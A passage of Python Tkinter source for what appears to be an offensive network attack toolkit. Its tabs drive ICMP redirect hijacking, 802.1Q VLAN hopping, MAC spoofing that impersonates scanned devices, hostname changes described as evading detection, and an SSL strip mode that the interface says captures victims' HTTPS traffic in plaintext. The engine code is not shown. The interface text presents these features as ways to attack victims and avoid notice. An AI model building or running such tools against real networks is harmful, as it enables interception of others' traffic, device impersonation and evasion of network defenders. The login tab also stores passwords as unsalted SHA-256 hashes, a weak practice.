                      '  Bypasses ARP-based defenses (DAI) — works on subnets where the gateway allows ICMP redirects.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        for label, attr, default in [
            ('Interface:',   '_redir_iface_var',  self._iface.get()),
            ('Target IP:',   '_redir_tgt_var',    ''),
            ('Gateway IP:',  '_redir_gw_var',     ''),
            ('New GW (us):', '_redir_newgw_var',  ''),
        ]:
            row = tk.Frame(body, bg=BG)
            row.pack(fill='x', pady=3)
            tk.Label(row, text=label, font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
            var = tk.StringVar(value=default)
            setattr(self, attr, var)
            ttk.Entry(row, textvariable=var, width=22).pack(side='left', padx=4)

        tb = tk.Frame(body, bg=BG)
        tb.pack(fill='x', pady=6)
        self._redir_start_btn = ttk.Button(tb, text='▶  START', style='Action.TButton',
                                            command=self._redirect_start)
        self._redir_start_btn.pack(side='left', padx=4)
        self._redir_stop_btn = ttk.Button(tb, text='■  STOP', style='Ghost.TButton',
                                           command=self._redirect_stop, state='disabled')
        self._redir_stop_btn.pack(side='left', padx=4)

        self._redir_log_box = tk.Text(body, height=10, bg='#060c16', fg='#7eb3e0',
                                       font=('Consolas', 8), state='disabled', relief='flat')
        self._redir_log_box.pack(fill='both', expand=True, pady=4)

    def _redirect_start(self):
        iface = self._redir_iface_var.get().strip()
        tgt   = self._redir_tgt_var.get().strip()
        gw    = self._redir_gw_var.get().strip()
        newgw = self._redir_newgw_var.get().strip()
        if not all([iface, tgt, gw, newgw]):
            messagebox.showwarning('Redirect', 'Fill in all four fields.', parent=self)
            return

        def _log(msg, level=''):
            def _do():
                self._redir_log_box.configure(state='normal')
                ts = time.strftime('%H:%M:%S')
                self._redir_log_box.insert('end', f'[{ts}]  {msg}\n')
                self._redir_log_box.see('end')
                self._redir_log_box.configure(state='disabled')
            self.after(0, _do)

        self._redirect_engine = ICMPRedirectEngine(iface, tgt, gw, newgw, _log)
        self._redirect_engine.start()
        self._redir_start_btn.configure(state='disabled')
        self._redir_stop_btn.configure(state='normal')

    def _redirect_stop(self):
        if self._redirect_engine:
            self._redirect_engine.stop()
            self._redirect_engine = None
        self._redir_start_btn.configure(state='normal')
        self._redir_stop_btn.configure(state='disabled')

    # ── Session Profiles tab ──────────────────────────────────────────────────

    def _build_session_tab(self):
        f = self._tab_session

        tk.Label(f, text='  SESSION PROFILES', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Save and restore complete target lists and attack configurations as named JSON profiles.\n'
                      '  Profiles are stored in ~/.regret/sessions/ and survive reboots — ideal for repeat engagements.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        row = tk.Frame(body, bg=BG)
        row.pack(fill='x', pady=3)
        tk.Label(row, text='Profile name:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._sess_name_var = tk.StringVar()
        ttk.Entry(row, textvariable=self._sess_name_var, width=28).pack(side='left', padx=4)

        tb = tk.Frame(body, bg=BG)
        tb.pack(fill='x', pady=6)
        ttk.Button(tb, text='💾 Save', style='Action.TButton',
                   command=self._session_save).pack(side='left', padx=4)
        ttk.Button(tb, text='📂 Load', style='Ghost.TButton',
                   command=self._session_load).pack(side='left', padx=4)
        ttk.Button(tb, text='🗑 Delete', style='Ghost.TButton',
                   command=self._session_delete).pack(side='left', padx=4)
        ttk.Button(tb, text='↻ Refresh', style='Ghost.TButton',
                   command=self._session_refresh).pack(side='left', padx=4)

        self._sess_listbox = tk.Listbox(body, bg='#0d1526', fg='#7eb3e0',
                                         font=('Consolas', 9), selectbackground='#1e3a5f',
                                         relief='flat', height=12)
        self._sess_listbox.pack(fill='both', expand=True, pady=4)

        self._session_refresh()

    def _session_save(self):
        name = self._sess_name_var.get().strip()
        if not name:
            messagebox.showwarning('Session', 'Enter a profile name.', parent=self)
            return
        data = {
            'hosts':    self._hosts,
            'targets':  [h['ip'] for h in self._hosts if h.get('selected')],
            'iface':    self._iface.get(),
            'gateway':  self._gw_var.get() if hasattr(self, '_gw_var') else '',
            'saved_at': time.strftime('%Y-%m-%d %H:%M:%S'),
        }
        path = save_session(name, data)
        self.log(f'Session saved → {path}', 'success')
        self._session_refresh()

    def _session_load(self):
        sel = self._sess_listbox.curselection()
        if not sel:
            messagebox.showinfo('Session', 'Select a profile to load.', parent=self)
            return
        path = self._sess_listbox.get(sel[0])
        try:
            data = load_session(path)
        except Exception as e:
            messagebox.showerror('Session', f'Load failed: {e}', parent=self)
            return
        self._hosts = data.get('hosts', [])
        self._rebuild_tree()
        if data.get('iface'):
            self._iface.set(data['iface'])
        self.log(f'Session loaded: {os.path.basename(path)}', 'success')

    def _session_delete(self):
        sel = self._sess_listbox.curselection()
        if not sel:
            messagebox.showinfo('Session', 'Select a profile to delete.', parent=self)
            return
        path = self._sess_listbox.get(sel[0])
        if messagebox.askyesno('Session', f'Delete {os.path.basename(path)}?', parent=self):
            delete_session(path)
            self._session_refresh()

    def _session_refresh(self):
        self._sess_listbox.delete(0, 'end')
        for p in list_sessions():
            self._sess_listbox.insert('end', p)

    # ── VLAN Hop tab ─────────────────────────────────────────────────────────

    def _build_vlan_tab(self):
        f = self._tab_vlan

        tk.Label(f, text='  VLAN HOPPING (802.1Q DOUBLE-TAG)', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Crafts double-tagged 802.1Q frames to escape the native VLAN and reach a target VLAN.\n'
                      '  Works only when attacker is on the switch native VLAN and the trunk port strips outer tags.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        if not DOT1Q_OK:
            tk.Label(f, text='  ✖  Scapy Dot1Q module not available.',
                     font=('Consolas', 10), bg=BG, fg='#c0392b').pack(anchor='w', padx=12, pady=20)
            return

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        for label, attr, default in [
            ('Interface:',     '_vlan_iface_var',   self._iface.get()),
            ('Native VLAN:',   '_vlan_native_var',  '1'),
            ('Target VLAN:',   '_vlan_target_var',  '10'),
            ('Target MAC:',    '_vlan_dstmac_var',  'ff:ff:ff:ff:ff:ff'),
            ('Target IP:',     '_vlan_dstip_var',   ''),
        ]:
            row = tk.Frame(body, bg=BG)
            row.pack(fill='x', pady=3)
            tk.Label(row, text=label, font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
            var = tk.StringVar(value=default)
            setattr(self, attr, var)
            ttk.Entry(row, textvariable=var, width=22).pack(side='left', padx=4)

        tb = tk.Frame(body, bg=BG)
        tb.pack(fill='x', pady=6)
        self._vlan_start_btn = ttk.Button(tb, text='▶  START', style='Action.TButton',
                                           command=self._vlan_start)
        self._vlan_start_btn.pack(side='left', padx=4)
        self._vlan_stop_btn = ttk.Button(tb, text='■  STOP', style='Ghost.TButton',
                                          command=self._vlan_stop, state='disabled')
        self._vlan_stop_btn.pack(side='left', padx=4)

        self._vlan_log_box = tk.Text(body, height=10, bg='#060c16', fg='#7eb3e0',
                                      font=('Consolas', 8), state='disabled', relief='flat')
        self._vlan_log_box.pack(fill='both', expand=True, pady=4)

    def _vlan_start(self):
        iface  = self._vlan_iface_var.get().strip()
        native = self._vlan_native_var.get().strip()
        target = self._vlan_target_var.get().strip()
        dstmac = self._vlan_dstmac_var.get().strip()
        dstip  = self._vlan_dstip_var.get().strip()
        if not all([iface, native, target, dstmac, dstip]):
            messagebox.showwarning('VLAN', 'Fill in all fields.', parent=self)
            return

        def _log(msg, level=''):
            def _do():
                self._vlan_log_box.configure(state='normal')
                ts = time.strftime('%H:%M:%S')
                self._vlan_log_box.insert('end', f'[{ts}]  {msg}\n')
                self._vlan_log_box.see('end')
                self._vlan_log_box.configure(state='disabled')
            self.after(0, _do)

        try:
            src_mac = get_if_hwaddr(iface)
        except Exception as e:
            messagebox.showerror('VLAN', f'Interface error: {e}', parent=self)
            return
        self._vlan_engine = VLANHopEngine(iface, int(native), int(target),
                                           src_mac, dstmac, dstip, _log)
        self._vlan_engine.start()
        self._vlan_start_btn.configure(state='disabled')
        self._vlan_stop_btn.configure(state='normal')

    def _vlan_stop(self):
        if self._vlan_engine:
            self._vlan_engine.stop()
            self._vlan_engine = None
        self._vlan_start_btn.configure(state='normal')
        self._vlan_stop_btn.configure(state='disabled')

    # ── MAC Changer tab ───────────────────────────────────────────────────────

    def _build_mac_tab(self):
        f = self._tab_mac

        tk.Label(f, text='  MAC ADDRESS CHANGER', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Changes your interface hardware MAC at the kernel level — no macchanger needed.\n'
                      '  Use before attacking to evade MAC-based filters, ARP logs, or to impersonate another device.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        # ── Left column: status + controls ───────────────────────────────────
        left = tk.Frame(body, bg=BG)
        left.pack(side='left', fill='both', expand=True, padx=(0, 6))

        # Status card
        status_card = tk.Frame(left, bg=BG3, padx=16, pady=14)
        status_card.pack(fill='x', pady=(0, 8))
        tk.Label(status_card, text='CURRENT STATUS', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 8))

        def _row(parent, label, var, color=CYAN):
            r = tk.Frame(parent, bg=BG3)
            r.pack(fill='x', pady=2)
            tk.Label(r, text=f'{label:<18}', font=('Consolas', 9),
                     bg=BG3, fg=TEXT_DIM).pack(side='left')
            tk.Label(r, textvariable=var, font=('Consolas', 9, 'bold'),
                     bg=BG3, fg=color).pack(side='left')

        self._mac_iface_var   = tk.StringVar(value='—')
        self._mac_current_var = tk.StringVar(value='—')
        self._mac_original_var= tk.StringVar(value='—')
        self._mac_status_var  = tk.StringVar(value='Original')

        _row(status_card, 'Interface:',     self._mac_iface_var,    TEXT)
        _row(status_card, 'Active MAC:',    self._mac_current_var,  CYAN)
        _row(status_card, 'Original MAC:',  self._mac_original_var, TEXT_DIM)
        _row(status_card, 'Status:',        self._mac_status_var,   GREEN)

        ttk.Button(status_card, text='⟳  REFRESH STATUS', style='Ghost.TButton',
                   command=self._mac_refresh_status).pack(anchor='w', pady=(10, 0))

        # Change-to card
        change_card = tk.Frame(left, bg=BG3, padx=16, pady=14)
        change_card.pack(fill='x', pady=(0, 8))
        tk.Label(change_card, text='CHANGE TO', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 10))

        self._mac_mode = tk.StringVar(value='random')

        # Option 1: Random
        r1 = tk.Frame(change_card, bg=BG3)
        r1.pack(fill='x', pady=3)
        ttk.Radiobutton(r1, text='Random MAC  (locally administered)',
                        variable=self._mac_mode, value='random',
                        command=self._mac_mode_changed).pack(side='left')
        self._mac_preview_var = tk.StringVar(value='')
        self._mac_preview_lbl = tk.Label(r1, textvariable=self._mac_preview_var,
                                          font=('Consolas', 9), bg=BG3, fg=YELLOW)
        self._mac_preview_lbl.pack(side='left', padx=10)
        ttk.Button(r1, text='↺', style='Ghost.TButton',
                   command=self._mac_regenerate).pack(side='left')
        self._mac_regenerate()

        # Option 2: Custom
        r2 = tk.Frame(change_card, bg=BG3)
        r2.pack(fill='x', pady=3)
        ttk.Radiobutton(r2, text='Custom MAC:',
                        variable=self._mac_mode, value='custom',
                        command=self._mac_mode_changed).pack(side='left')
        self._mac_custom_var = tk.StringVar(value='aa:bb:cc:dd:ee:ff')
        self._mac_custom_entry = ttk.Entry(r2, textvariable=self._mac_custom_var,
                                            font=('Consolas', 9), width=20)
        self._mac_custom_entry.pack(side='left', padx=8)
        self._mac_custom_entry.configure(state='disabled')

        # Option 3: Mimic
        r3 = tk.Frame(change_card, bg=BG3)
        r3.pack(fill='x', pady=3)
        ttk.Radiobutton(r3, text='Mimic from scan:',
                        variable=self._mac_mode, value='mimic',
                        command=self._mac_mode_changed).pack(side='left')
        self._mac_mimic_var = tk.StringVar()
        self._mac_mimic_cb  = ttk.Combobox(r3, textvariable=self._mac_mimic_var,
                                             font=('Consolas', 9), width=38,
                                             state='disabled')
        self._mac_mimic_cb.pack(side='left', padx=8)
        ttk.Button(r3, text='⟳', style='Ghost.TButton',
                   command=self._mac_reload_mimic).pack(side='left')

        tk.Label(change_card,
                 text='  Mimic copies another device\'s MAC — your machine appears as that device on the network',
                 font=('Consolas', 8), bg=BG3, fg=TEXT_DIM).pack(anchor='w', pady=(4, 0))

        # Action buttons
        btn_card = tk.Frame(left, bg=BG3, padx=16, pady=12)
        btn_card.pack(fill='x')
        self._mac_apply_btn = ttk.Button(btn_card, text='▶  APPLY MAC CHANGE',
                                          style='Accent.TButton',
                                          command=self._mac_apply)
        self._mac_apply_btn.pack(side='left', padx=(0, 10))
        self._mac_restore_btn = ttk.Button(btn_card, text='↺  RESTORE ORIGINAL',
                                            style='Ghost.TButton',
                                            command=self._mac_restore,
                                            state='disabled')
        self._mac_restore_btn.pack(side='left')

        # ── Right column: info + how-to ───────────────────────────────────────
        right = tk.Frame(body, bg=BG3, padx=16, pady=14, width=280)
        right.pack(side='left', fill='y', padx=(6, 0))
        right.pack_propagate(False)

        tk.Label(right, text='HOW IT WORKS', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 10))

        tips = [
            ('Random',  'Generates a new LAA MAC each time.\nGood for anonymity — looks like a\nvirtual/spoofed device.'),
            ('Custom',  'Enter any valid MAC manually.\nUseful for specific spoofing scenarios\nor testing allowlists.'),
            ('Mimic',   'Copies a real device\'s MAC from\nthe scan list. Your machine will\nappear as that device on the\nnetwork (including to the router).'),
            ('Restore', 'Resets to the original hardware\nMAC stored before any change.'),
        ]
        for title, desc in tips:
            tk.Label(right, text=f'  {title}', font=('Consolas', 9, 'bold'),
                     bg=BG3, fg=CYAN).pack(anchor='w', pady=(8, 1))
            tk.Label(right, text=f'  {desc}', font=('Consolas', 8),
                     bg=BG3, fg=TEXT_DIM, justify='left').pack(anchor='w')

        tk.Frame(right, bg=BORDER, height=1).pack(fill='x', pady=12)
        tk.Label(right, text='  TIP: Change MAC before\n  launching GARP/Spoof\n  so packets look legitimate.',
                 font=('Consolas', 8), bg=BG3, fg=YELLOW, justify='left').pack(anchor='w')

        # Init status on open
        self._mac_refresh_status()

    # ── MAC Changer actions ────────────────────────────────────────────────────

    def _mac_refresh_status(self):
        iface = self._iface.get()
        if not iface:
            return
        self._mac_iface_var.configure(value=iface)
        cur = get_current_mac(iface)
        self._mac_current_var.configure(value=cur or '—')
        orig = self._original_mac.get(iface) or get_permanent_mac(iface) or cur
        self._mac_original_var.configure(value=orig or '—')
        changed = self._mac_changed and self._original_mac.get(iface)
        self._mac_status_var.configure(
            value='CHANGED  ◀ active spoof' if changed else 'Original',
        )
        if changed:
            self._mac_status_var.set('CHANGED  ◀ active spoof')
        else:
            self._mac_status_var.set('Original')

    def _mac_regenerate(self):
        mac = generate_random_mac()
        self._mac_preview_var.set(mac)

    def _mac_mode_changed(self):
        mode = self._mac_mode.get()
        self._mac_custom_entry.configure(
            state='normal' if mode == 'custom' else 'disabled')
        self._mac_mimic_cb.configure(
            state='readonly' if mode == 'mimic' else 'disabled')
        if mode == 'mimic':
            self._mac_reload_mimic()

    def _mac_reload_mimic(self):
        """Populate mimic dropdown from current scan results."""
        if not self._hosts:
            self._mac_mimic_cb['values'] = ['No scan results — run Scanner first']
            self._mac_mimic_cb.set('No scan results — run Scanner first')
            return
        entries = []
        for h in self._hosts:
            name = h.get('netbios') or h.get('hostname') or ''
            label = f"{h['ip']:<18}  {h['mac']}  {('— ' + name) if name else ''}"
            entries.append(label)
        self._mac_mimic_cb['values'] = entries
        if entries:
            self._mac_mimic_cb.set(entries[0])

    def _mac_apply(self):
        iface = self._iface.get()
        if not iface:
            self.log('[-] No interface selected', 'error')
            return

        mode = self._mac_mode.get()

        if mode == 'random':
            new_mac = self._mac_preview_var.get()
        elif mode == 'custom':
            new_mac = self._mac_custom_var.get().strip()
        else:  # mimic
            val = self._mac_mimic_var.get()
            if not val or 'No scan' in val:
                self.log('[!] No host selected for mimic', 'warn')
                return
            # Extract MAC from "IP  MAC  — name" format
            parts = val.split()
            new_mac = parts[1] if len(parts) >= 2 else ''

        if not new_mac or len(new_mac) != 17:
            self.log(f'[-] Invalid MAC address: {new_mac}', 'error')
            return

        # Save original before first change
        if iface not in self._original_mac:
            orig = get_permanent_mac(iface) or get_current_mac(iface)
            self._original_mac[iface] = orig

        def _worker():
            try:
                apply_mac(iface, new_mac)
                self._mac_changed = True
                self.after(0, self._mac_refresh_status)
                self.after(0, self._mac_restore_btn.configure, {'state': 'normal'})
                self.after(0, self.log,
                           f'[+] MAC changed on {iface}: {new_mac}  (mode: {mode})',
                           'success')
                self.after(0, self._mac_preview_var.set,
                           generate_random_mac())  # pre-gen next random
            except Exception as e:
                self.after(0, self.log, f'[-] MAC change failed: {e}', 'error')

        threading.Thread(target=_worker, daemon=True).start()

    def _mac_restore(self):
        iface = self._iface.get()
        orig  = self._original_mac.get(iface)
        if not orig:
            self.log('[!] No original MAC recorded for this interface', 'warn')
            return

        def _worker():
            try:
                apply_mac(iface, orig)
                self._mac_changed = False
                self.after(0, self._mac_refresh_status)
                self.after(0, self._mac_restore_btn.configure, {'state': 'disabled'})
                self.after(0, self.log,
                           f'[+] MAC restored on {iface}: {orig}', 'success')
            except Exception as e:
                self.after(0, self.log, f'[-] MAC restore failed: {e}', 'error')

        threading.Thread(target=_worker, daemon=True).start()

    # ── Hostname tab ──────────────────────────────────────────────────────────

    def _build_hostname_tab(self):
        f = self._tab_hostname

        tk.Label(f, text='  HOSTNAME CHANGER', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Changes your device hostname — visible to DHCP servers, routers, and reverse-DNS lookups.\n'
                      '  Rename to something neutral before scanning to avoid appearing as a threat on the network.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        # ── Left: status + form ───────────────────────────────────────────────
        left = tk.Frame(body, bg=BG)
        left.pack(side='left', fill='both', expand=True, padx=(0, 6))

        # Current hostname card
        cur_card = tk.Frame(left, bg=BG3, padx=16, pady=14)
        cur_card.pack(fill='x', pady=(0, 8))
        tk.Label(cur_card, text='CURRENT HOSTNAME', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 8))

        row1 = tk.Frame(cur_card, bg=BG3)
        row1.pack(fill='x', pady=2)
        tk.Label(row1, text='Hostname:         ', font=('Consolas', 9),
                 bg=BG3, fg=TEXT_DIM).pack(side='left')
        self._hn_current_var = tk.StringVar(value=get_current_hostname())
        tk.Label(row1, textvariable=self._hn_current_var,
                 font=('Consolas', 10, 'bold'), bg=BG3, fg=CYAN).pack(side='left')

        row2 = tk.Frame(cur_card, bg=BG3)
        row2.pack(fill='x', pady=2)
        tk.Label(row2, text='FQDN:             ', font=('Consolas', 9),
                 bg=BG3, fg=TEXT_DIM).pack(side='left')
        try:
            fqdn = socket.getfqdn()
        except Exception:
            fqdn = '—'
        tk.Label(row2, text=fqdn, font=('Consolas', 9),
                 bg=BG3, fg=TEXT_DIM).pack(side='left')

        ttk.Button(cur_card, text='⟳  REFRESH', style='Ghost.TButton',
                   command=self._hn_refresh).pack(anchor='w', pady=(10, 0))

        # Change form card
        form_card = tk.Frame(left, bg=BG3, padx=16, pady=14)
        form_card.pack(fill='x', pady=(0, 8))
        tk.Label(form_card, text='NEW HOSTNAME', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 8))

        tk.Label(form_card,
                 text='Rules: letters, digits and hyphens only. No spaces. Max 63 chars.',
                 font=('Consolas', 8), bg=BG3, fg=TEXT_DIM).pack(anchor='w', pady=(0, 6))

        entry_row = tk.Frame(form_card, bg=BG3)
        entry_row.pack(fill='x')
        self._hn_entry = ttk.Entry(entry_row, font=('Consolas', 11), width=28)
        self._hn_entry.pack(side='left', ipady=4)
        self._hn_entry.insert(0, get_current_hostname())

        self._hn_error = tk.Label(form_card, text='', font=('Consolas', 8),
                                   bg=BG3, fg=ACCENT)
        self._hn_error.pack(anchor='w', pady=(6, 0))

        # Buttons
        btn_row = tk.Frame(left, bg=BG3, padx=16, pady=12)
        btn_row.pack(fill='x')
        ttk.Button(btn_row, text='▶  APPLY HOSTNAME',
                   style='Accent.TButton',
                   command=self._hn_apply).pack(side='left', padx=(0, 10))
        ttk.Button(btn_row, text='⟳  RESET FIELD',
                   style='Ghost.TButton',
                   command=lambda: (self._hn_entry.delete(0, 'end'),
                                    self._hn_entry.insert(0, get_current_hostname()),
                                    self._hn_error.configure(text=''))).pack(side='left')

        # ── Right: info panel ─────────────────────────────────────────────────
        right = tk.Frame(body, bg=BG3, padx=16, pady=14, width=280)
        right.pack(side='left', fill='y', padx=(6, 0))
        right.pack_propagate(False)

        tk.Label(right, text='WHY CHANGE HOSTNAME?', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 10))

        reasons = [
            ('Anonymity',    'Your hostname is broadcast over\nthe network and visible to\nrouters, DHCP servers, and\nother devices.'),
            ('Spoofing',     'Match a hostname to a mimicked\nMAC to fully impersonate\nanother device.'),
            ('Recon hiding', 'Rename to something neutral\nbefore scanning to avoid\nlooking like a threat.'),
        ]
        for title, desc in reasons:
            tk.Label(right, text=f'  {title}', font=('Consolas', 9, 'bold'),
                     bg=BG3, fg=CYAN).pack(anchor='w', pady=(8, 1))
            tk.Label(right, text=f'  {desc}', font=('Consolas', 8),
                     bg=BG3, fg=TEXT_DIM, justify='left').pack(anchor='w')

        tk.Frame(right, bg=BORDER, height=1).pack(fill='x', pady=12)
        tk.Label(right,
                 text='  ⚠  A device restart is\n  required for the new\n  hostname to fully\n  propagate on the network.',
                 font=('Consolas', 8), bg=BG3, fg=YELLOW, justify='left').pack(anchor='w')

    # ── Hostname actions ───────────────────────────────────────────────────────

    def _hn_refresh(self):
        self._hn_current_var.set(get_current_hostname())

    def _hn_apply(self):
        import re
        new_name = self._hn_entry.get().strip()

        # Validate
        if not new_name:
            self._hn_error.configure(text='Hostname cannot be empty.')
            return
        if len(new_name) > 63:
            self._hn_error.configure(text='Max 63 characters.')
            return
        if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?$', new_name):
            self._hn_error.configure(
                text='Invalid characters. Use letters, digits, hyphens only.')
            return

        self._hn_error.configure(text='')

        def _worker():
            try:
                set_hostname(new_name)
                self.after(0, self._hn_refresh)
                self.after(0, self.log,
                           f'[+] Hostname changed to "{new_name}"', 'success')
                self.after(0, self._hn_show_restart_popup, new_name)
            except Exception as e:
                self.after(0, self._hn_error.configure,
                           {'text': f'Failed: {e}'})
                self.after(0, self.log,
                           f'[-] Hostname change failed: {e}', 'error')

        threading.Thread(target=_worker, daemon=True).start()

    def _hn_show_restart_popup(self, new_name):
        messagebox.showinfo(
            'Restart Required',
            f'Hostname successfully changed to:\n\n'
            f'    {new_name}\n\n'
            f'Please restart your device for the new hostname\n'
            f'to fully take effect on the network.',
            parent=self
        )

    # ── Password Reset tab ────────────────────────────────────────────────────

    def _build_pwreset_tab(self):
        f = self._tab_pwreset

        tk.Label(f, text='  PASSWORD RESET', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Change your tool login credentials. Passwords are SHA-256 hashed and stored locally.\n'
                      '  File: ~/.regret/creds.json  |  Permissions: 600 (owner-read-only, never plain-text).',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        # Centre the form
        outer = tk.Frame(f, bg=BG)
        outer.pack(fill='both', expand=True)
        card = tk.Frame(outer, bg=BG3, padx=30, pady=24)
        card.place(relx=0.5, rely=0.5, anchor='center')

        def _field(parent, label, show=''):
            tk.Label(parent, text=label, font=('Consolas', 8, 'bold'),
                     bg=BG3, fg=TEXT_DIM).pack(anchor='w', pady=(10, 2))
            e = ttk.Entry(parent, font=('Consolas', 10), width=30,
                          show=show if show else '')
            e.pack(fill='x', ipady=5)
            return e

        tk.Label(card, text='CHANGE PASSWORD', font=('Consolas', 10, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 4))
        tk.Frame(card, bg=BORDER, height=1).pack(fill='x', pady=(0, 6))

        self._pwr_user    = _field(card, 'USERNAME')
        self._pwr_current = _field(card, 'CURRENT PASSWORD', show='●')
        self._pwr_new     = _field(card, 'NEW PASSWORD',     show='●')
        self._pwr_confirm = _field(card, 'CONFIRM NEW PASSWORD', show='●')

        # Password strength bar
        tk.Label(card, text='STRENGTH', font=('Consolas', 7, 'bold'),
                 bg=BG3, fg=TEXT_DIM).pack(anchor='w', pady=(10, 2))
        self._pwr_strength_bar = ttk.Progressbar(card, maximum=100,
                                                   length=300, mode='determinate')
        self._pwr_strength_bar.pack(fill='x')
        self._pwr_strength_lbl = tk.Label(card, text='',
                                           font=('Consolas', 8), bg=BG3, fg=TEXT_DIM)
        self._pwr_strength_lbl.pack(anchor='w')
        self._pwr_new.bind('<KeyRelease>', self._pwr_check_strength)

        self._pwr_msg = tk.Label(card, text='', font=('Consolas', 8),
                                  bg=BG3, fg=ACCENT)
        self._pwr_msg.pack(pady=(10, 0))

        ttk.Button(card, text='▶  SAVE NEW PASSWORD', style='Accent.TButton',
                   command=self._pwr_apply).pack(fill='x', pady=(10, 0))

        # Info panel below form
        info = tk.Frame(card, bg=BG3)
        info.pack(fill='x', pady=(16, 0))
        tk.Frame(info, bg=BORDER, height=1).pack(fill='x', pady=(0, 8))
        tk.Label(info,
                 text='  Credentials are stored in:   ~/.regret/creds.json\n'
                      '  File permissions: 600 (owner read-only)\n'
                      '  Passwords are SHA-256 hashed — never stored in plain text',
                 font=('Consolas', 8), bg=BG3, fg=TEXT_DIM,
                 justify='left').pack(anchor='w')

    def _pwr_check_strength(self, _event=None):
        pw = self._pwr_new.get()
        score = 0
        hints = []
        if len(pw) >= 8:  score += 25
        else:             hints.append('min 8 chars')
        if any(c.isupper() for c in pw): score += 25
        else:             hints.append('add uppercase')
        if any(c.isdigit() for c in pw): score += 25
        else:             hints.append('add a number')
        if any(c in '!@#$%^&*()_+-=[]{}' for c in pw): score += 25
        else:             hints.append('add a symbol')
        self._pwr_strength_bar['value'] = score
        if score <= 25:   color, label = ACCENT,  'Weak'
        elif score <= 50: color, label = YELLOW,  'Fair'
        elif score <= 75: color, label = CYAN,    'Good'
        else:             color, label = GREEN,   'Strong'
        hint_str = '  ·  '.join(hints)
        self._pwr_strength_lbl.configure(
            text=f'{label}{"  —  " + hint_str if hints else ""}',
            fg=color)

    def _pwr_apply(self):
        username   = self._pwr_user.get().strip()
        current_pw = self._pwr_current.get()
        new_pw     = self._pwr_new.get()
        confirm_pw = self._pwr_confirm.get()

        def _err(msg):
            self._pwr_msg.configure(text=msg, fg=ACCENT)

        if not username or not current_pw or not new_pw or not confirm_pw:
            _err('All fields are required.')
            return
        if not _check_credentials(username, current_pw):
            _err('Current password is incorrect.')
            return
        if new_pw != confirm_pw:
            _err('New passwords do not match.')
            return
        if len(new_pw) < 6:
            _err('New password must be at least 6 characters.')
            return

        try:
            _update_password(username, new_pw)
            self._pwr_msg.configure(
                text='✓  Password updated successfully.', fg=GREEN)
            self._pwr_current.delete(0, 'end')
            self._pwr_new.delete(0, 'end')
            self._pwr_confirm.delete(0, 'end')
            self._pwr_strength_bar['value'] = 0
            self._pwr_strength_lbl.configure(text='')
            self.log(f'[+] Password updated for user "{username}"', 'success')
        except Exception as e:
            _err(f'Failed to save: {e}')
            self.log(f'[-] Password reset failed: {e}', 'error')

    # ── HSTS Strip tab ────────────────────────────────────────────────────────

    def _build_sslstrip_tab(self):
        f = self._tab_sslstrip

        # ── Title ─────────────────────────────────────────────────────────────
        hdr = tk.Frame(f, bg=BG2, pady=8)
        hdr.pack(fill='x')
        tk.Label(hdr, text='  ◉  HSTS DOWNGRADE  /  SSL STRIP',
                 font=('Consolas', 11, 'bold'), bg=BG2, fg=ACCENT).pack(side='left', padx=4)

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  SSL Strip — removes HSTS headers and rewrites HTTPS links to HTTP via transparent proxy.\n'
                      '  Requires mitmproxy + MITM mode active. Victims HTTPS traffic is captured in plaintext.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
